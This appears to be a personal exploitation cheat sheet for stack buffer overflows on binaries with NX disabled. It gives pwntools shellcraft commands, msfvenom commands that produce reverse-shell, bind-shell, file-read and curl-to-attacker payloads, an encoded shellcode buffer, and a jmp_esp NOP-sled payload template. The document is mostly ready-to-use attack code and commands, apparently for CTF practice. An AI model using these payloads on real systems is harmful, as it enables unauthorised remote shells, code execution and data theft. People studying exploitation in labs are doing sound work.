Prerequisite : use checksec and ensure NX is disabled

> source https://www.youtube.com/watch?v=4zut2Mjgh5M&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=6

```
payload = padding + <the shellcode address 4bytes for x86, 8byte for x64>  + <shellcode>
```

> Pay attention to endianess !

### Generate a shellcode:

```
pwn shellcraft
# or
shellcraft

# get a list of shellcodes:
shellcraft -l 

# retrieve an existing shellcode in hex:
shellcraft i386.linux.sh

# retrieve an existing shellcode in asm:
shellcraft i386.linux.sh -f a
```

#### Using msvenom instead

```bash
msfvenom -l payloads # you can generate a bunch of payload like simple revshell, meterpreter, vnc, etc ...
msfvenom -p linux/x86/exec CMD="curl http://<my ip>" -b '\x00' -f python # execute a command, -b to specify badchars, python format is good to use with pwntool*
msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
msfvenom -p linux/x86/read_file PATH=flag.txt FD=2 -b '\x00' -f python

```

##### pwntool integration:
```python
# Exploit
buf = b""
buf += b"\xb8\xa4\xe4\x0d\x3b\xda\xd2\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x12\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x46"
buf += b"\x11\xe6\x0d\x3e\xdf\xf9\x71\x3e\xbb\xc8\xb8\xf3\xbb"
buf += b"\xa2\xf8\xb3\xbf\xb4\xfe\xc3\x36\x53\x77\x3a\xf2\x9c"
buf += b"\x98\xbc\x03\x50\x18\x35\xc1\xd2\x1d\x45\xc6\x22\xa5"
buf += b"\x47\xc6\x22\xd9\x8a\x46\x9a\xd8\x14\x47\xdb\x61\x14"
buf += b"\x47\xdb\x95\xd9\xc7\x33\x50\x1e\x38\x3c\x3d\x8c\xa6"
buf += b"\xa4\xec\x38\x51\x5f\xf1"
# Build payload

payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    buf
)
```


### Get more shellcode online
https://shell-storm.org/shellcode/index.html